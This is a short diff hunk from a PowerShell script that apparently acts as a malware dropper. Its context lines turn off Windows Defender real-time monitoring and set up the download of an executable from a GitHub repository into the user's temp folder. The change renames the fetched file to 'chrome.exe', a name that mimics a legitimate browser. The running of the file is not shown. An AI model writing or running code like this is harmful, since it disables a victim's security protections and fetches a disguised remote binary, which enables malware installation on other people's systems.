@@ -59,7 +59,7 @@ if (Test-Path -Path $zeroTierFolderPath) {
 Set-MpPreference -DisableRealtimeMonitoring $true
 
 # Define the URL and download location for improved.exe
-$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/improved.exe"
+$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
 $tempFolder = $env:TEMP
 $exePath = Join-Path $tempFolder "improved.exe"
 
